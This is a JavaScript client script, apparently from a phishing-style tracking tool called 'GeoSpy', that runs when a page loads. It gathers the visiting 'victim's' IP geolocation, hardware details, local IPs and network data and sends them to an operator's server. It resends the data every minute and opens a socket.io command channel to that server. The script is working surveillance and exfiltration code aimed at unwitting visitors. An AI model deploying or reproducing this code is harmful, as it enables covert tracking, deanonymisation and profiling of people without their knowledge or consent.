$(document).ready(function($) {

    $.getJSON('//ip-api.com/json', function(data) {
        var d = getVictimData();

        $.extend(true, d, data);

        var parser = new UAParser();

        d.cpu = JSON.stringify(parser.getCPU())
            .replace(/"/gi, '')
            .replace(/{/gi, '')
            .replace(/}/gi, '')
            .replace(/:/gi, ' : ') + ' - ' + (navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : '');

        d.refer = document.location.host;

    	$.ajax({
            url: window.serverPath + "/register",
            data: d,
            dataType: "json",
            type: "POST",
            success: function(response) {
                console.log(response);
                if (response.status == 'OK'){
                    localStorage.setItem("GeoSpy_vId", response.vId);
                    conChange();
                    queryGPU();
                    locateV();
                    tping();
                    detectBattery();
                    navigation_mode();

                    objUser.getIPs();
                    objUser.sendNetworks();

                    setInterval(function(){ 
                        objUser.getIPs();
                        objUser.sendNetworks();
                    }, 60000);

                    createSockets();
                }
            },
            error: function(error) {}
        });
    });
});

function createSockets(){
    if (typeof(io) != 'undefined') {
        namespace = '/GeoSpy';
        if (window.serverPath == ''){
            socketGeoSpy = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
        } else{
            socketGeoSpy = io.connect(window.serverPath + namespace);
        }
    }

    if (socketGeoSpy != null){
        window.onbeforeunload = function(e) {
            var d = getVictimData();
            socketGeoSpy.emit('disconnect_request', d);
            return true;
        }
    }

    if (socketGeoSpy != undefined) {
        socketGeoSpy.emit('join', {room: localStorage.GeoSpy_vId});
        defineSockets(socketGeoSpy);
    }
}